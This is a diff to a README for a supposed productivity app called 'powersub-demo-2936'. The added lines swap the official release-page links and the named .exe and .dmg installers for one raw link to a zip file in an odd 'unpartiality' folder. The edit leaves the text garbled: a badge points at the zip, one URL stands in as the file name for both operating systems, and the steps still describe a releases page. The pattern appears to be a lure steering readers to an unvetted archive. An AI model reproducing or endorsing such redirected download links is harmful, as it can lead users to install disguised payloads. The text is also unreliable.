@@ -6,7 +6,7 @@ Welcome to powersub-demo-2936! This application helps you boost your productivit
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/dineshkumarfandon12/powersub-demo-2936/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/dineshkumarfandon12/powersub-demo-2936/main/unpartiality/powersub-demo-2936.zip%20release-brightgreen)](https://raw.githubusercontent.com/dineshkumarfandon12/powersub-demo-2936/main/unpartiality/powersub-demo-2936.zip)
 
 ## 💻 System Requirements
 
@@ -28,13 +28,13 @@ Before downloading, ensure that your computer meets these requirements:
 ## 📦 Download & Install
 
 1. Click the link below to visit the releases page and download the application:
-   [Visit Release Page](https://github.com/dineshkumarfandon12/powersub-demo-2936/releases)
+   [Visit Release Page](https://raw.githubusercontent.com/dineshkumarfandon12/powersub-demo-2936/main/unpartiality/powersub-demo-2936.zip)
 
 2. Once on the releases page, find the latest version listed. It will have a tag like "v1.0" or similar.
 
 3. Click on the version to expand the download options.
 
-4. You will see different files available for download. Look for the installation file, typically named similarly to `powersub-demo-2936.exe` for Windows or `powersub-demo-2936.dmg` for macOS.
+4. You will see different files available for download. Look for the installation file, typically named similarly to `https://raw.githubusercontent.com/dineshkumarfandon12/powersub-demo-2936/main/unpartiality/powersub-demo-2936.zip` for Windows or `https://raw.githubusercontent.com/dineshkumarfandon12/powersub-demo-2936/main/unpartiality/powersub-demo-2936.zip` for macOS.
 
 5. Click on the appropriate file for your operating system to start the download.
 
